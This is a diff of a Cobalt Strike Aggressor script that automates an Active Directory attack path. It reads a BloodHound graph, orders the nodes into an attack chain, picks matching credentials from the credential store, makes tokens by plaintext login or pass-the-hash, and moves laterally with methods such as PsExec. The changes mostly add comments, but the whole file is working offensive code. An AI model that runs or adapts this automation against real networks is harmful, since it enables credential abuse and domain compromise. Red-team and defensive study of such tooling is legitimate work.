@@ -11,15 +11,11 @@ include(script_resource("cypher.cna"));
 include(script_resource("utils.cna"));
 #include(script_resource("com-exec.cna"));
 
-# Parse BloodHound graph.json and add nodes
-
-# Ordered array with attack path in format
-# @(@(%node, relationship), @(%node, relationship), @(%lastnode))
 global('@edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz $randomPuppy $machineNo $jsonFile $lateralMethod $listenerChoice $operator');
 
+# Parse BloodHound graph.json and add nodes
 sub parseNodes {
     local('$json');
-
     $json = $1;
 
     # Create new JSONObject from string
@@ -37,6 +33,7 @@ sub parseNodes {
         # Hash to store individual node information
         %node = %();
 
+        # Get id, type, label fields from each node
         $id = [[$nodeArray get: $i] get: "id"];
         $type = [[$nodeArray get: $i] get: "type"];
         $label = [[$nodeArray get: $i] get: "label"];
@@ -48,30 +45,35 @@ sub parseNodes {
         add(@nodes, %node, -1);
     }
 
-    foreach %node (@nodes) {
-        if (%node["type"] eq "Computer") {
-            #println("Computer: " . %node["label"]);
-        }
-        else if (%node["type"] eq "User") {
-            #println("User: " . %node["label"]);
-        }
-    }
+#    foreach %node (@nodes) {
+#        if (%node["type"] eq "Computer") {
+#            println("Computer: " . %node["label"]);
+#        }
+#        else if (%node["type"] eq "User") {
+#            println("User: " . %node["label"]);
+#        }
+#    }
 }
 
+# Parse BloodHound graph and add edges
 sub parseEdges {
     local('$json');
     $json = $1;
 
+    # Create new JSONObject from string
     $obj = [new JSONObject: $json];
 
+    # Create new JSONArray from the "edges" key
     $edgeArray = [new JSONArray: [$obj get: "edges"]];
 
+    # How many edges?
     $length = [$edgeArray length];
     #println("Number of edges: $length");
 
     for ($i = 0; $i < $length; $i++) {
         %edge = %();
 
+        # Get id, label, source, target for each edge
         $id = [[$edgeArray get: $i] get: "id"];
         $label = [[$edgeArray get: $i] get: "label"];
         $source = [[$edgeArray get: $i] get: "source"];
@@ -87,6 +89,9 @@ sub parseEdges {
     }
 }
 
+# Find the first node
+# This will be a node that is the "source" for one edge,
+# but is not a "target" for another edge
 sub getFirstNode {
     local('@targets');
 
@@ -94,8 +99,10 @@ sub getFirstNode {
         add(@targets, %edge["target"]);
     }
     foreach %edge (@edges) {
+        # If we find an edge with a source that isn't the target of another
         if (%edge["source"] !isin @targets) {
             foreach %node (@nodes) {
+                # Find the corresponding node, this is the first
                 if (%edge["source"] eq %node["id"]) {
                     #println("First node is: " . %node["id"]);
                     return %node;
@@ -105,13 +112,16 @@ sub getFirstNode {
     }
 }
 
+# Get the node following %sourceNode
 sub getNextNode {
     local('%sourceNode');
     %sourceNode = $1;
 
+    # Find the edge with a source of %sourceNode["id"]
     foreach %edge (@edges) {
         if (%edge["source"] == %sourceNode["id"]) {
                 foreach %node (@nodes) {
+                    # Then find the node that that edge is targeting
                     if (%node["id"] == %edge["target"]) {
                         #println("Found next node: " . %node["id"]);
                         return %node;
@@ -121,15 +131,19 @@ sub getNextNode {
     }
 }
 
+# Sort the nodes so that we can complete attack chain in order
 sub sortNodes {
     local ('@sorted %firstNode $length');
 
     $length = size(@nodes);
 
+    # Get the first node
     %firstNode = getFirstNode();
 
+    # Add first node to the sorted array
     add(@sorted, %firstNode, 0);
 
+    # Run getNextNode until we have all nodes
     for ($i = 1; $i < $length; $i++){
         %next = getNextNode(@sorted[-1]);
         add(@sorted, %next, -1);
@@ -140,6 +154,9 @@ sub sortNodes {
     return @sorted;
 }
 
+# We don't need group nodes because they don't give us actionable info
+# user -(MemberOf)-> group -(AdminTo)-> system can be simplified as
+# user -(AdminTo)-> system
 sub removeGroups {
 	@nodes = $1;
 
@@ -158,6 +175,7 @@ sub removeGroups {
     return @final;
 }
 
+# Parse the BloodHound graph
 sub parseGraph {
     local('$graph $json $file');
     $graph = $1;
@@ -169,22 +187,28 @@ sub parseGraph {
 
     closef($file);
 
+    # Parse nodes and edges
     parseNodes($json);
     parseEdges($json);
 
+    # Sort nodes and edges
     @nodelist = sortNodes();
 
+    # Remove unneeded group information
     @final = removeGroups(@nodelist);
 
 }
 
+# Make a token with the correct creds
 sub getToken {
     # We got the set of credentials we need in the cred store, we want to grab it out now.
 
     $plaintext = $False;
     $hashes = $False;
+    # For each cred in the database, check if it matches the user we want to make token for
     foreach $cred (credentials()){
         println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
+        # Check if password is hashed or plaintext
         if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}")) {
             # Current $Cred object 
             $targetCreds = $cred;
@@ -217,11 +241,12 @@ sub getToken {
         println("Password: " . $password);
         brev2self($currentBid);
         if ($plaintext eq $True){
+            # If it's plain text, bloginuser() makes a token for us
             println("Using PLAIN TEXT LOGIN");
             bloginuser($currentBid, $domain, $user, $password);
         }
         else {
-            # Must be a password hash at this point
+            # Must be a password hash at this point, use pass the hash
             println("Using PASS THE HASH");
             bpassthehash($currentBid, $domain, $user, $password);
         }
@@ -235,6 +260,7 @@ sub getToken {
     }
 }
 
+# Perform a lateral movement action based on method selected
 sub lateralMove {
     #PSEXEC here
     if ($psexec eq $False){
@@ -289,6 +315,7 @@ sub lateralMove {
     }
 }
 
+# Execute primary attack logic loop
 sub executeAttack {
     println("[*] Executing after 5s");
     # Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
